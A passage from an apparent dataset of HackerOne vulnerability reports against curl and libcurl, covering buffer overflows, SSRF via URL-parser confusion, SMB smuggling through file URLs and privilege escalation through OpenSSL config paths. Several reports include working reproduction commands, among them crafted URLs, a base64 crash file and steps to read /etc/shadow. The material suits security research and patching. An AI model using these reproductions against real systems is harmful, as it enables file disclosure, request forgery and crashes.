    "original_report": "Summary:\n--------\n\nIf dns over http is used, the hostname to look up is packed into a buffer to send to the dns server using the doh\\_encode function from the doh.c source file. By default, curl uses a 512 byte buffer. For that length, the buffer may be overflowed with one byte, which is set to 1.\n\nNote that this happens even with the fix in <https://github.com/curl/curl/pull/4345> which Daniel made after I emailed about a similar bug in the curl/doh repository.\n\nSteps To Reproduce:\n-------------------\n\nBuild curl with address sanitizer, and/or add an assert\nassert(\\*olen <=len) ;\nright before returning from doh\\_encode() in doh.c <https://github.com/curl/curl/blob/65f5b958c95d538a9b205e2753a476d1a7c89179/lib/doh.c#L135>\n\nThen issue a curl request:\n`src/curl --doh-url https://irrelevant/ x....xxxxxxxxxxxxxxxxxxxxx.x....x.xxxxxxxxxx.xxxxxxxxx.xxxxxxxxxxx.xxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxxxx...xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.x.x.......xxxxxxxxxxxxxxxxxxxxxx...xxxxxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx...xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx......xxxxxx.....xx..........xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxx..x......xxxxxxxx..xxxxxxxxxxxxxxxxxxx.x...xxxx.x.x.x...xxxxx`\n\nSupporting Material/References:\n-------------------------------\n\nWhen adding the assert above, this is the output of the above command:\n\ncurl: ../../../lib/doh.c:144: DOHcode doh\\_encode(const char *, DNStype, unsigned char* , size\\_t, size\\_t *): Assertion `*olen <=len' failed.\n\nImpact\n------\n\nIf the attacker somehow can control the hostname eventually used by curl, and DOH is in use, the buffer overflow can happen.\n\nFor the common case where dnsprobe.dohbuffer is used, the overwrite may be immediately remedied by assignment to the length (see <https://github.com/curl/curl/blob/65f5b958c95d538a9b205e2753a476d1a7c89179/lib/doh.c#L195> )\nThis relies on the compiler not rearranging the writes."
},
{
    "url": "https://hackerone.com/reports/694988",
    "original_report": "Summary:\n--------\n\nIf a DOH server is used, which is not really a DOH server but just a normal web server, the DNS request is sent but the reply will not be the expected DNS payload. In that case, curl correctly thinks DNS resolution failed, but it does not clean up allocated memory properly.\n\nSteps To Reproduce:\n-------------------\n\nSee the attached demonstration program. It can use either no DOH, a valid DOH, a garbage DOH address, or a valid web server not serving DOH.\nValgrind sees that it leaks memory only in the last case, the others are cleaned up properly.\n\n### Leaking case\n\nThis will use <https://example.com/> both as the URL to reach and as a DOH.\n\n### Normal case - no DOH\n\nThis will use <https://example.com/> without DOH.\n\n### Normal case - working DOH\n\nThis will use <https://example.com/> with cloudflare DOH.\n\nSupporting Material/References:\n-------------------------------\n\nSee the attached program.\n\nImpact\n------\n\nThe failed DOH is invisible to the end user, it seems to fallback to normal DNS.\nSo if the user has the wrong DOH adress (perhaps confused, or the DOH url changed slightly and now points to some generic hello page), I guess the memory leaks will add up, eventually leading to denial of service because of resource depletion.\n\nIt does not feel like a serious issue but I wanted to go through hackerone instead of filing a public report right away."
},
{
    "url": "https://hackerone.com/reports/696822",
    "original_report": "Summary:\n--------\n\nIf cookiejar is set, cookies are written to file at exit. That is done by the function cookie\\_output() in cookie.c. The cookies are sorted before being stored, using qsort on a temporary array. That temporary array is uninitialized (gotten from malloc at <https://github.com/curl/curl/blob/7c596f5dea586c1ba99dfbe7f3ce1996d82f7de0/lib/cookie.c#L1534> ). This would not be a problem unless there also is a bug in the range given to qsort\n<https://github.com/curl/curl/blob/7c596f5dea586c1ba99dfbe7f3ce1996d82f7de0/lib/cookie.c#L1550>\nwhich is numcookies. However, it should be j which is used for counting at <https://github.com/curl/curl/blob/7c596f5dea586c1ba99dfbe7f3ce1996d82f7de0/lib/cookie.c#L1546>.\n\nThe buffer passed to qsort is partially filled with cookie data, and the rest is uninitialized. When qsort sorts, it will dereference the supposed to be pointers to compare the elements and depending on the results jump around reading in memory.\n\nSteps To Reproduce:\n-------------------\n\nI found this through fuzzing and I do not want to make that public until the problems I find are fixed - in case you want it now already, just hit me up. I attached the most important part of the fuzzer.\n\nIt is not obvious how to reproduce without the fuzzer: (c->numcookies must be nonzero and co->domain must not be set on at least one of them for this bug to be triggered. Perhaps by loading an evil cookie file from disk.\n\nTo detect it, address and undefined sanitizers are not sufficient. That is likely because qsort is a library function, so it's not instrumented. Valgrind does not always catch it either. I found it by adding an assert on pointer alignment inside the cookie\\_sort\\_ct(), and eventually found which of the 60000 test cases I had caused it.\n\nSuggested fix\n-------------\n\nEven better (defence in depth) would be to allocate array with calloc instead of malloc which would cause (near null) pointer dereference instead of \"random\" values.\n\nSupporting Material/References:\n-------------------------------\n\nAttached is\n\n* the test case to feed as input to the fuzzer above.\n* crash report from valgrind and assert()\n\nImpact\n------\n\nThis is read access, and if triggered it will perhaps cause a crash (segmentation fault), and the cookie jar is not written. So a fairly benign bug."
},
{
    "url": "https://hackerone.com/reports/707006",
    "original_report": "I ran fuzzing with the internal fuzzer at <https://github.com/pauldreik/curl-fuzzer/blob/paul/localfuzz_public0/intree_fuzzer/src/insidefuzzers/fuzz_cookies.cc>\n\nIt seems like the following sequence of events trigger the use after free:\n\nEven if the program above is a \"fuzz only\" type of use case, I am not sure\nif a real user would be able to trigger this situation.\nAnyway, the following seems to fix it:\n\nAddress sanitizer gets this output, without the fix (line numbers are not accurate, they refer to a temporary branch):\n\nImpact\n------\n\nNo idea."
},
{
    "url": "https://hackerone.com/reports/714215",
    "original_report": "Preface: While I have an interest in security, I am not a professional security researcher, so please be forgiving of any lack of convention in this submission. The intent is to help improve security of the OpenSSL and curl projects, their consumers and end users. I will be sending this same content to both projects, curl via hackerone, and OpenSSL via [openssl-security@openssl.org](mailto:openssl-security@openssl.org), per directions at each maintainer website.\n\nI'm writing with regard to:\n\n* OpenSSL [CVE-2019-1552](/hacktivity/cve_discovery?id=CVE-2019-1552)\n* curl [CVE-2019-5443](/hacktivity/cve_discovery?id=CVE-2019-5443)\n\nBackground:\n\n* The root of each of these is that a default path in the OpenSSL build system for Windows targets is a location writable by a non-privileged user, and that OpenSSL configuration files placed there can change the behavior of OpenSSL, including code execution and escalation of privilege.\n* A PoC for code execution and escalation of privilege was published at:\n  <https://hackerone.com/reports/608577>\n* This PoC uses a dynamic engine definition in such an OpenSSL configuration file to load a DLL in the security context of the application integrating the OpenSSL library, whose DLL\\_PROCESS\\_ATTACH handler inside DllMain can execute code in that context. This permits a non-elevated user to deploy code that may be executed by an elevated application.\n\nContext of this email:\n\n* I am currently working with OpenSSL 1.0.2t as a LTS solution.\n* I have not tested or substantially researched other branches at this time.\n\nSummary of current status:\n\n* OpenSSL project appears to have:\n  + Designated [CVE-2019-1552](/hacktivity/cve_discovery?id=CVE-2019-1552) as \"Low\" severity, even though the issue allows for EoP and potentially degrading the communication security intent of integrating applications, e.g. via inserting CA certificates.\n  + At a high level, stated as \"Fixed in OpenSSL 1.0.2t\" (<https://www.openssl.org/news/vulnerabilities.html>) by this commit:\n    <https://github.com/openssl/openssl/commit/d333ebaf9c77332754a9d5e111e2f53e1de54fdd>\n    The fix is, however, a fix to documentation, and changes in the build script that add a sample for --prefix that is similarly insecure.\n* curl project appears to have:\n  + Recommended that users update to 7.65.1\\_2\n  + Stated that this commit \"completely disables curl's ability to load an OpenSSL config when invoked.\"\n    <https://github.com/curl/curl-for-win/commit/51b658a76594942cf1d6f227d8fc4732bb8ec277>\n\nMy contentions:\n\n(A) The statement that [CVE-2019-1552](/hacktivity/cve_discovery?id=CVE-2019-1552) was \"Fixed in OpenSSL 1.0.2t\" is extremely misleading, and could likely lead to users of the project updating OpenSSL without realizing that additional changes are required on their part.\n\n(B) The sample \"--prefix=c:/some/openssl/dir\" is equally as vulnerable as the default, but more significantly, it is difficult to conceive of a path that is actually safe to use, and this might not be obvious to all developers. For example:\n\n* C:\\Windows\\System32 - Windows may not always be installed on drive letter 'C', leaving a hard-coded path similarly vulnerable on some systems\n* C:\\Program Files - This path can be localized (e.g. \"Programmes\" in French-native installations), leaving a hard-coded path similarly vulnerable on some systems\n\n  The OpenSSL code does not support passing an environment variable for runtime resolution, which would be a still vulnerable option, not least because Configure.pl will modify any path that is not an absolute path with drive letter, or one beginning with \"/\":\n\n  $openssldir=$prefix . \"/\" . $openssldir if $openssldir !~ /(^\\/|^[a-zA-Z]:[\\\\/])/;\n\n  One of few \"safer\" options I could think of was passing --prefix=\\NUL --openssldir=\\NUL, which should lead to a path or compound path after Configure.pl that is guaranteed to be invalid or else contain no content under Windows.\n\n  In fact, in the aforementioned hackerone thread, \"vsz\" alludes to the fact that the fix in curl is not guaranteed:\n\n  \"After further experiments, I managed to tweak the build so that engine support can be kept enabled, and OpenSSL be built with a secure prefix. The trick was to use C:/Windows/System32/OpenSSL. This location can be fairly assumed to be a restricted directory on majority of installs and on all default installs going back a long time.\"\n\n  Per above, this in not true unless Windows is installed on the 'C' drive. These are supposed to be projects implementing security, potentially integrated into end products distributed to millions of users with varying OS configurations. I personally would not call this \"fixed\". \"Hardened\", perhaps.\n\n  (C) This still does not make the OpenSSL library safe, and I believe curl [CVE-2019-5443](/hacktivity/cve_discovery?id=CVE-2019-5443) is actually *not fixed*, because the OpenSSL will read the path to configuration data from the OPENSSL\\_CONF environment variable.\n\n  I downloaded curl 7.66.0 from:\n\n  <https://curl.haxx.se/windows/dl-7.66.0_2/curl-7.66.0_2-win32-mingw.zip>\n\n  I could compile and execute the same PoC as provided in the hackerone thread simply by setting the user-level environment variable:\n\n  OPENSSL\\_CONF=C:\\test\\openssl.cnf\n\n  The OpenSSL library used by curl (and other third-party apps who integrate it), will read this environment variable before the hard-coded path. Windows does not elevation to set user-level environment variables, and child processes can inherit them. This means that any elevated application using the OpenSSL library started from a compromised user account can be used as a EoP technique in the same way as before. For example, if OPENSSL\\_CONF is set at the user level, and the user signs out and later signs in again, the shell (Explorer.exe) inherits this environment variable, as does any process the user elevates.\n\n  I have not tested, but if, as the text on the OpenSSL vulnerabilities page alludes to, this also allows someone to \"insert CA certificates, modify (or even replace) existing engine modules\", this same issue potentially weakens the communications secrecy of integrating apps.\n\n  Aside: I see various places in the OpenSSL library code where other environment variables are queried, and I do not have time to evaluate each for potential issues.\n\nImpact\n------\n\nThe attacker could run code in the context of an elevated process if they can modify user-level environment variables, or when Windows is not installed on the C drive.\n\nEssentially, this report is that issues similar to [CVE-2019-5443](/hacktivity/cve_discovery?id=CVE-2019-5443) persist in curl 7.66.0."
},
{
    "url": "https://hackerone.com/reports/770190",
    "original_report": "Summary:\n--------\n\nfile\\_connect() routine (<https://github.com/curl/curl/blob/1b71bc532bde8621fd3260843f8197182a467ff2/lib/file.c#L134>) does not prevent access to /proc/self/fd pseudo filesystem. Application using libcurl and accepting URLs to fetch can be tricked to return content of any open file by passing a specially crafted file:///proc/self/fd/<number> URLs. Since the specific files are open by the application itself, they will always be accessible as long as the files remain open. This will bypass for example drop of privileges performed after opening the file(s).\n\nSteps To Reproduce:\n-------------------\n\n[add details for how we can reproduce the issue]\n\n1. Open a privileged file (for example /etc/shadow)\n2. Drop the process privileges\n3. Accept URL as user input\n4. Fetch URL with libcurl\n5. Send received data to user\n\nSupporting Material/References:\n-------------------------------\n\nImpact\n------\n\nAuthorization bypass: Access to privileged files otherwise not accessible via file://"
},
{
    "url": "https://hackerone.com/reports/774883",
    "original_report": "Summary:\n--------\n\nIn fly() there will be a division by zero if progress bar width is 2.\n\nThat can happen if terminal width is 2.\n\nSteps To Reproduce:\n-------------------\n\nThis script crash:\nstty rows 10 cols 2 ; curl --progress-bar somefile > temp\n\nImpact\n------\n\nI believe that if it's possible to set terminal width for a service, then that service will not be able to curl."
},
{
    "url": "https://hackerone.com/reports/627245",
    "original_report": "Summary:\n--------\n\nThe function header\\_append contains an integer overflow, it can bypass the check on the length and can lead to a subsequent heap buffer overflow.\n\nSteps To Reproduce:\n-------------------\n\nI don't have PoC, but here there is a little description of the problem (vulnerable code)\n\nAdditional info\n---------------\n\nAs I mentioned I don't have a PoC, but I saw that this function could be reached in different ways e.g., evil server, by running curl with a specific argument (extend the header size), curl API (but not sure).\n\nImpact\n------\n\n* It can lead on a RCE"
},
{
    "url": "https://hackerone.com/reports/600359",
    "original_report": "Summary:\n--------\n\nInteger overflow in the source code tool\\_cb\\_prg.c\n\nSteps To Reproduce:\n-------------------\n\nReview the source code of tool\\_cb\\_prg.c\nIn the function fly, pay attention to Line 80, 82, 84\n\nin Line 80, Line 82, Line 84, there are integer overflow issues.\nthe type of 'tick' is 'unsigned int'\nbar->tick could be a large value, then bar->tick + 5 may revert to a small value.\nHere no big impact and only logic error.\n\nI think maybe a logic like this is better to avoid integer overflow.\n`pos = sinus[((bar->tick)%200 + 5)%200] / (10000 / check);`\n\nI am not sure if I directly create this issue on github is the correct way, so I report it here.\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n* [attachment / reference]\n\nThe output of the my self-development code scan tool:\n[Scanning] /home/a/Data/curl/src/tool\\_cb\\_prg.c\nInteger Overflow found in file: /home/a/Data/curl/src/tool\\_cb\\_prg.c, Line: 80, Column: 28\npos = sinus[(bar->tick + 5)%200] / (10000 / check);\nInteger Overflow found in file: /home/a/Data/curl/src/tool\\_cb\\_prg.c, Line: 82, Column: 28\npos = sinus[(bar->tick + 10)%200] / (10000 / check);\nInteger Overflow found in file: /home/a/Data/curl/src/tool\\_cb\\_prg.c, Line: 84, Column: 28\npos = sinus[(bar->tick + 15)%200] / (10000 / check);\n\nImpact\n------\n\nThis integer overflow has no big impact and only may cause business logic error."
},
{
    "url": "https://hackerone.com/reports/637800",
    "original_report": "Summary:\n--------\n\nWe have encountered an issue with libcurl where, under certain network conditions, the library will attempt to submit data to an incorrect port as was set by CURLOPT\\_PORT. As information is sent to an unauthorised port, we consider this an information disclosure issue.\n\nOur security software encompasses a Windows application (an agent) that runs as a Windows service. Its purpose is to collect custom metrics from the machine, such as IO operations (file reads, file writes, ...), process start/stops, user login, and some other forensic info. We use libcurl to communicate with a server over HTTPS.\n\nA customer with ~5000 our agents raised an issue that approx 0.5% of all traffic is sent to port 443. In our application, we only use port 8080. Each request is made with source code (nearly identical) to the one I attach to this report.\n\nThis client uses Windows DNS load balancing. An agent will make a request to a local DNS server and the server will return an IP of one of the 5 servers based on round-robin. All servers have a web server running and our server-side application working on port 8080.\n\nWe were unable to pin-point exactly which network conditions trigger this issue reliably, however, we have been able to reproduce it in a production environment with logging enabled. This could potentially be triggered by a slow server response or when the web server is down.\n\nSteps To Reproduce:\n-------------------\n\n1. Configure a round-robin DNS load balancing\n2. Make a high number of small HTTPS request to port 8080\n3. [Potentially] Server fails to handle a response [exact conditions were not established]\n4. Approx 0.5% of all traffic will be directed to port 443, under the hood, without application instructions\n\nSupporting Material/References:\n-------------------------------\n\n* Example source code\n* Log sample showing the `primary port` is changed to 443\n\nVersions\n--------\n\n* OS: Windows 10 x64\n\nLibraries\n\n* curl:x86-windows-static 7.61.1-7\n* curl[http2]:x86-windows-static\n* curl[openssl]:x86-windows-static\n* curl[ssl]:x86-windows-static\n* curl[winssl]:x86-windows-static\n* fmt:x86-windows-static 5.3.0-1\n* gtest:x86-windows-static 2019-01-04-2\n* nghttp2:x86-windows-static 1.35.0\n* nlohmann-json:x86-windows-static 3.6.1\n* openssl-windows:x86-windows-static 1.0.2q-2\n* openssl:x86-windows-static 0\n* rapidcheck:x86-windows-static 2018-11-05-1\n* rapidxml:x86-windows-static 1.13\n* spdlog:x86-windows-static 1.3.1\n* zlib:x86-windows-static 1.2.11-5\n\nImpact\n------\n\nAn attacker must have access to the authorised server, for example, be a local admin.\n\nThe server is expected to run a web app on a port other than 443, for example, port 8080.\n\nA client application will send traffic to only port 8080. But libcurl will occasionally send traffic to port 443.\n\nIf an attacker set up a web app on port 443, they will receive some traffic (0.5%) that was supposed to be sent to a different port."
},
{
    "url": "https://hackerone.com/reports/889160",
    "original_report": "Summary:\n--------\n\nWhen an incomplete server header is missing its value, the curl client will receive the packet but hang while parsing it. Examples of vulnerable server headers: `Location`, `Content-Range` and `Connection`. Adding the `--max-time`option will terminate the request as intended.\n\nSteps To Reproduce:\n-------------------\n\n1. Set up server: `echo -e \"HTTP/1.1 200 OK\\r\\nLocation:\\r\\nContent-Range:\\r\\nConnection:\\r\\n\" | nc -l -p 1337`\n2. Make the request: `curl --connect-timeout 1 http://localhost:1337`\n\nSupporting Material/References:\n-------------------------------\n\nThe bug was found using AFL with network support. The repository <https://github.com/kugg/fuzzminator> with the commit hash id `08a0102fbf633e5de3d43a01b995e1ca8e68bbd3`.\n\n* The attached file named `hangs.tar.gz` contains results from AFL including headers resulting in a hang.\n* Note: Location header is parsed even without the `--location` option and also when the server indicate `200 OK`.\n\n**Strace output**\n`$ strace curl -v --connect-timeout 1 http://localhost:1337`\n\nImpact\n------\n\nThis vulnerability could lead to denial of service of one given http request.\nCurl is often used for crawling, when this is the case a curl process could be blocked indefinitely by a server providing incomplete headers.\nIf curl is used for fetching third party information through a web interface an attacker with SSRF or XXE access could use this bug to exhaust process id numbers or amount of allowed forks for the process by locking up curl clients."
},
{
    "url": "https://hackerone.com/reports/726117",
    "original_report": "Summary:\n--------\n\nWhile CURL 7.62 > parses URLs that have an ? (parameter separator) char after the # (fragment separator), CURL urlapi code treats the path with the hash part as it being the same one, this may allow some problem on specific protocols that may have a security impact.\nOn HTTP, an attacker may be able to modify original requests by appending \"?\" to the fragment part of the URL, see first example.\nOn FILE, CURL can be confused while requesting FILE urls to get a file from a different server that the user intended on Windows as the FILE protocol on Windows supports SMB.\n\nSteps To Reproduce:\n-------------------\n\nHTTP Example:\n\nFile example:\n\nImpact\n------\n\nModify expected request behavior on several protocols"
},
{
    "url": "https://hackerone.com/reports/687734",
    "original_report": "Summary:\n--------\n\nWhen `Curl_http_compile_trailers()` fails, `trailers_buf` is freed twice, because we don't pass to this function the pointer value by reference.\n\nSteps To Reproduce:\n-------------------\n\nDid not actually reproduce, please double check patch attached and analysis.\n\nImpact\n------\n\nSome memory corruption due to the double-free."
},
{
    "url": "https://hackerone.com/reports/688048",
    "original_report": "Summary:\n--------\n\nThe IPv6 ip address can be specified with square brackets like [fe80::3]. There can also be a zone id specified like [fe80::3%15]. A URL can specify its hostname with IPv6 literal,\n\nIt seems that the parsing in curl library is not complete. For instance, it is possible for particular IPv6 literals to trigger an http or https request on rather unexpected hostname.\n\nSee for instance the potentially misleading hostname:\n`https://[ab.be%google.com]/query`\n\nWhen used with the available online sample program 'simple.c', there is no error. The https request is performed on the Belgian website '<https://ab.be'> and the SSL certificate is properly validated against 'ab.be', not 'google.com'.\n\nSteps To Reproduce:\n-------------------\n\n1. Build attached modified `simple.c`\n2. `gcc simple.c && ./a.out https://[ab.be%google.com]/query`\n3. Check with Wireshark actual DNS / IP traffic, actually is https and corresponds to 'ab.be'\n\n* The command line 'curl' binary itself is performing sanities so the url above is rejected.\n* The 'Host:' header field happens to contain square brackets. An attacker would have an http server handling that detail. Currently 'ab.be' responds with error 400 bad request.\n\nSupporting Material/References:\n-------------------------------\n\n`simple.c`\n\nImpact\n------\n\nUser might get confused and connect on the wrong hostname."
},
{
    "url": "https://hackerone.com/reports/704621",
    "original_report": "Summary:\n--------\n\nCurl is vulnerable to SSRF due to improperly parsing the host component of the URL compared to other URL parsers and the [URL living standard](https://url.spec.whatwg.org/).\n\nPOC\n---\n\n`curl -sD - -o /dev/null \"http://google.com:80\\\\@yahoo.com/\"`\n\nCurl makes a request to `yahoo.com` instead of `google.com`.\n\nSupporting Material/References:\n-------------------------------\n\n* [Exact question to URL standards body](https://github.com/jsdom/whatwg-url/issues/137#issuecomment-536797948)\n* [CVE-2018-3774](https://nvd.nist.gov/vuln/detail/CVE-2018-3774) similar vulnerability in an NPM lib\n  + See also: <https://hackerone.com/reports/384029>\n\nTo quote the standards body issue:\n\n> Specifically the authority state deals with parsing the @ properly. However as you'll notice if it encounters the `\\` beforehand, it'll go into the host state and reset the pointer at which point it won't consider `google.com:80\\\\` auth data for `yahoo.com` anymore.\n\nOther Libraries\n---------------\n\nImpact\n------\n\nIf another library implementing the URL standard is used to white/blacklist a request by host but the actual request is made via curl or the curl library, an attacker can smuggle the request past the URL validator thus allowing an attacker to perform SSRF or an open redirect attack."
},
{
    "url": "https://hackerone.com/reports/724134",
    "original_report": "Summary:\n--------\n\nWe've seen race conditions when using CURL\\_LOCK\\_DATA\\_CONNECT in libcurl where sometimes two different threads using two different easy handles ends up sharing the same connection pointer at the same time.\nThis causes UAFs and double frees when both threads are freeing items on the same connection pointer.\n\nSteps To Reproduce:\n-------------------\n\nI added curl.cpp which stresses CURL\\_LOCK\\_DATA\\_CONNECT and should eventually trigger an ASAN error with curl compiled using clang's address sanitizers.\nIt's not consistent how it fails since it's a threading issue. I've found that it's more consistent after adding a random sleep after the unlock here <https://github.com/curl/curl/blob/master/lib/url.c#L1372>.\n\nA colleague suggested that a potential fix could be to remove the CONN\\_INUSE check from [this condition](https://github.com/curl/curl/blob/master/lib/url.c#L1194)  because the connection isn't actually marked as inuse until a different set of lock and unlocks. It does appear to stop the crashes but we're unsure on how ideal that fix is.\n\nSupporting Material/References:\n-------------------------------\n\ncurl.cpp - Repro code\nasan-output.txt - Asan results with some added logging\nNotably three threads with different easy handles decide to reuse the 0x61b000fbd688 connection at the same time.\n\nImpact\n------\n\nNot sure how much of a security impact or exploitable this is in practice since it's pretty inconsistent on when it's hit."
},
{
    "url": "https://hackerone.com/reports/765664",
    "original_report": "Summary:\n--------\n\nWhilst fuzzing the curl command line tool (built from commit 779b415) with AFL, ASAN and libdislocator, a heap buffer overflow was triggered when a crafted curl configuration file was loaded.\n\nSteps To Reproduce:\n-------------------\n\n`echo \"LXdAAAou\" | base64 -d > test0070.conf`\n`./curl -q -K test0070.conf file:///dev/null`\n\nSupporting Material/References:\n-------------------------------\n\nImpact\n------\n\nApplication crash plus other as yet undetermined consequences"
},
{
    "url": "https://hackerone.com/reports/518097",
    "original_report": "The issue was reported to the project on 18 January 2019.\nA patch was sent to me on 19 January 2019.\ncurl 7.64.0 was released on 6 January 2019.\n\n<https://curl.haxx.se/docs/CVE-2019-3823.html>\n\nImpact\n------\n\nIf the buffer passed to `smtp_endofresp()` isn't NUL terminated and contains no character ending the parsed number, and `len` is set to 5, then the `strtol()` call reads beyond the allocated buffer."
},
{
    "url": "https://hackerone.com/reports/812969",
    "original_report": "Summary:\n--------\n\nThe released fix for [CVE-2019-15601](/hacktivity/cve_discovery?id=CVE-2019-15601), SMB access smuggling via FILE URL on Windows, leaves curl still vulnerable to SMB access smuggling via FILE URLs.\n\n* FILE URLs formatted as `file:////smb_server/smb_share/file` are not filtered.\n* FILE URLs which point to the global DOS name space, \\??\\, and formatted as `file:///%3f%3f/UNC/smb_server/smb_share/file_name` or `file:///%3f%3f/GLOBAL/UNC/smb_server/smb_share/file` are not filtered.\n\nSteps To Reproduce:\n-------------------\n\n1. `curl file:////localhost/c$/windows/win.ini`\n2. `curl file:///%3f%3f/UNC/localhost/c$/windows/win.ini`\n3. `curl file:///%3f%3f/GLOBAL/UNC/localhost/c$/windows/win.ini`\n\nThe above examples will return the contents of C:\\Windows\\win.ini utilizing SMB to fetch the file via the local administrative share for the C drive. This will also work with remote shares.\n\nImpact\n------\n\nA properly crafted URL could cause a user to unknowingly access a remote file."
},
{
    "url": "https://hackerone.com/reports/872089",
    "original_report": "Summary:\n--------\n\nThere is an incorrect integer overflow check in `Curl_auth_create_plain_message` in `lib/vauth/cleartext.c` , leading to a potential heap buffer overflow of controlled length and data. The exploitation seems quite easy, yet the vulnerability can only be triggered locally and does not seem to lead to RCE.\n\nThis vulnerability is very similar to [CVE-2018-16839](https://curl.haxx.se/docs/CVE-2018-16839.html) but was introduced later in [this commit](https://github.com/curl/curl/commit/762a292f8783d73501b7d7c93949268dbb2e61b7)\n\nVulnerability:\n--------------\n\nIn (1), `zlen + clen` can overflow, making the check for integer overflow useless.\n\nIn (2), `plainlen` can thus overflow, leading to an incorrect size for memory allocation done in (3).\n\nA heap buffer overflow of controlled size can then occur in (4), as we can compute `clen`, `plen` and `zlen` as needed for the overflow to occur in (1) and (2).\n\nThe data in `authzid` might be fully controlled and can lead to a trivial exploitation of the heap buffer overflow.\n\nLimitations:\n------------\n\nThis vulnerability is not trivially triggered, as it requires the `authzid`, `authcid` and `passwd` strings to be controlled by an attacker, and require at least 2 of them to be over 2GB-long, which is not very likely to happen.\n\nMoreover, there are more limitations on strings, as they can not be over 2GB of size, if set through curl\\_easy mechanisms, but I believe they can be set with no such limitations through configuration files (untested).\n\nI did not include any PoC code for such reasons. I can always try to make one later if necessary.\n\nImpact\n------\n\nThis might lead to local code execution through a heap buffer overflow, or, in case of unknown usage of libcurl from an application, to RCE (yet not very likely)."
},
{
    "url": "https://hackerone.com/reports/715413",
    "original_report": "Summary:\n--------\n\nA user may invoke the curl command line utility with an IP address literal in the URL, such as\n\n<https://192.168.124.2/>...\n\nIf the HTTPS server presents a certificate whose Common Name matches this IP address literal as a *string* (that is, Common Name is the ASCII string `192.168.124.2`), then curl accepts the certificate (assuming it is properly signed by a trusted CA).\n\nThis is wrong. Per [RFC-2818, section *3.1. Server Identity*](https://tools.ietf.org/html/rfc2818#section-3.1):\n\nIn some cases, the URI is specified as an IP address rather than a\nhostname. In this case, the iPAddress subjectAltName must be present\nin the certificate and must exactly match the IP in the URI.\n\nThat is, if the user-specified URL contains an IPv4 or IPv6 address literal, then the server certificate may only match the URL if the certificate contains the same *numeric* IP address in the *SAN*, as a `GEN_IP` entry.\n\nCurl should first attempt `X509_VERIFY_PARAM_set_ip_asc()`, and call `X509_VERIFY_PARAM_set1_host()` only if the former fails.\n\nSteps To Reproduce:\n-------------------\n\n1. Generate a new certificate request, for example with the [`genkey` utility](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system_administrators_guide/ch-web_servers#s3-apache-mod_ssl-genkey), specifying the server's IPv4 or IPv6 address on the command line / in the Common Name field. (My `genkey` is from `crypto-utils-2.4.1-42.el7.x86_64`.)\n2. Sign the certificate request with a local CA such that `curl` trust the local CA.\n3. Configure Apache's `mod_ssl` such that it listen on the IPv4 or IPv6 address in question.\n4. Fetch an URI with curl from the web server, using the `https` scheme, and the IP address.\n5. Curl accepts the certificate.\n\nSupporting Material/References:\n-------------------------------\n\nThis issue with curl popped up while discussing the edk2 patch series mitigating [CVE-2019-14553](/hacktivity/cve_discovery?id=CVE-2019-14553):\n\n<https://bugzilla.tianocore.org/show_bug.cgi?id=960>\n<http://mid.mail-archive.com/20190927034441.3096-1-Jiaxin.wu@intel.com>\n\nImpact\n------\n\nI'm not sure this problem can be used for an *attack*. It's just that string representations of IP addresses are not unique. URL to Subject Name matching should use canonical representations only."
},
{
    "url": "https://hackerone.com/reports/713975",
    "original_report": "Summary:\n--------\n\nCode in vtls/nss.c interprets CApath option differently than OpenSSL-using code,\nuser can be mislead to unsecure use of curl/libcurl easily. CApath directory\ncan contain CRL files in addition to CA certificate files and they are used\nfor certificate verification when curl calls OpenSSL. Code path using NSS blindly\nloads all files residing in CApath as CA certificates instead, which has two effects:\nfirst, the meaning of CRLs is ignored and revoked certificates can be accepted,\nsecond, NSS may find duplicate SN in corrupt 'CA certificate' during TLS handshake and break\nconnection to legitimate server (NSS does not perform full validation in load\nand search routines, ASN.1 templates used can mistakenly match both types of object).\nSuch use is not explicitly supported according to curl documentation strictly speaking\nbut I find current implementation very risky (I know security professionals who have fallen to this trap)\nand recommend adding validation/type detection for each file loaded\nfrom CApath (or using c\\_hash-style name extensions if any file with such extension\nis present, if full validation is deemed too complicated or as a quick fix helping most users).\n\nSteps To Reproduce:\n===================\n\n1. revoke a certificate, install resulting CRL in CApath, try with NSS-based curl\n2. try connecting TLS server whose CA has self-signed certificate with SN=1 and CRL in CApath\n   (success can depend on order of directory entries)\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n* [attachment / reference]\n\nImpact\n------\n\nAn attacker can impersonate TLS server using revoked (presumably leaked) certificate."
},
{
    "url": "https://hackerone.com/reports/1049624",
    "original_report": "Summary:\n--------\n\nThere is known technique to exploit inconsistency of URL parser and URL requester logic to perform Server Side Request Forgery attack. Firstly it was presented by Orange Tsai at [A New Era Of SSRF Exploiting URL Parser](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf). Firstly I found the familiar issue at old versions of curl, but exploit did not seems works at latest releases. But now I'm ready to share new exploit of issue.\n\nSteps To Reproduce:\n-------------------\n\nSchema parser logic of curl library is vulnerable to \"Abusing URL Parsers\". Malicious user can use this weakness to bypass whitelist protection and perform Server Side Request Forgery against targets, that use vulnerable version of library.\n\n1. curl \"ssrf3.twowaysyncapp.tk://google.com\" Protocol \"ssrf3.twowaysyncapp.tk\" not supported or disabled in libcurl\n2. curl \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.twowaysyncapp.tk://google.com\" Host aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.twowaysyncapp.tk requested\n\nSupporting Material/References:\n-------------------------------\n\nDetails about attack presented at <https://btlfry.gitlab.io/owasp/#/21> The main difference at new version of library subdomain name should be much longer.\n\n* [curl.png 